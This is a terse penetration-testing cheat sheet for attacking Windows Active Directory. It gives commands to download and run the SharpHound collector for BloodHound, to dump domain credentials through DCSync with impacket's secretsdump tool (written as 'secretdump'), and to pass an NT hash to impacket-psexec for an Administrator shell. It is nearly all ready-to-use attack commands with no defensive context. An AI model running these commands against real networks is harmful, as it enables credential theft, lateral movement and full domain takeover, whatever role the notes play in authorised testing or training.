____

# Bloodhound

```bash
wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
```


```PS
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

## Analysis

### Add pwned users

Outbound control rights --> First degree object control


## DCSync

```bash
impacket-secretdump domain.local/user@$IP
```

```bash
impacket-secretdump 'user:pass@$IP'
```
## Pass the hash

```bash
impacket-psexec domain.local/Administrator@$IP cmd.exe -hashes :NT
```
